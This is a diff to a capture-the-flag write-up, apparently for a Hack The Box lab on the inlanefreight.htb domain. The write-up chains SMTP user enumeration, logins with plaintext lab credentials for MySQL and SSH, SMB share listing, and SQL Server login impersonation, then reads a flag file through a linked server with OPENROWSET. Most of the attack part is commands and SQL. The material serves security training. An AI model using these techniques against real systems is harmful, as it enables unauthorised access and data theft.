@@ -28,7 +28,7 @@ nmap -p- -T4 [IP1]
 SmTP was vulnerable to user enumeration using the `RCPT TO` method.
 
 ```bash
-smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -D inlanefreight.htb -t [IP1]
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t [IP1]
 ```
 
 **Found user:** `fiona@inlanefreight.htb`
@@ -53,7 +53,7 @@ fiona@inlanefreight.htb:987654321
 Connected to MySQL using the discovered credentials. Note the `--skip-ssl` flag due to TLS requirement.
 
 ```bash
-mysql -h [IP2] -u fiona -p987654321 --skip-ssl
+mysql -h [IP2] -u fiona -p987654321
 ```
 
 ---
@@ -147,7 +147,7 @@ simon:8Ns8j1b!23hs4921smHzwn
 ### Step 4: SSH Login
 
 ```bash
-ssh simonA[I]J2
+ssh simon
 ```
 
 ---
@@ -186,7 +186,6 @@ smbclient -L //[IP3] -N
 
 **Found Shares:** 
 - `ADMIN$`
-- C$`
 - `Home` ← **Target**
 - `IPC$`
 
@@ -288,44 +287,13 @@ SELECT name, type_desc FROM sys.sql_logins;
 **Result:**
 ```
 sa           SQL_LOGIN
-john        SL_LOGIN
+john        SQL_LOGIN
 simon        SQL_LOGIN
 ```
 
 ---
 
-### Step 6: Check Impersonation Permissions
-
-```sql
-SELECT 
-    p.name AS grantee,
-    permission_name
-FROM sys.server_permissions perm
-JOIN sys.server_principals p ON perm.grantee_principal_id = p.principal_id
-WHERE permission_name = 'IMPERSONATE';
-```
-
-**Result:**
-```
-WINSRV02\Database Readers    IMPERSONATE
-```
-
----
-
-### Step 7: Find Linked Servers
-
-```sql
-SELECT name, product, provider, data_source FROM sys.servers;
-```
-
-**Result:** 
-```
-LOCAL.TEST.LINKED.SRV    SQL Server    SMQLCLI    LOCAL.TEST.LINKED.SRV
-```
-
----
-
-### Step 8: Impersonate `john`
+### Step 6: Impersonate `john`
 
 ```sql
 EXECUTE AS LOGIN = 'john';
@@ -338,7 +306,7 @@ GO
 
 ---
 
-### Step 9: Read Flag via Linked Server
+### Step 7: Read Flag via Linked Server
 
 ```sql
 EXECUTE ('select * from OPENROWSET BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents) AT [local.test.linked.srv];
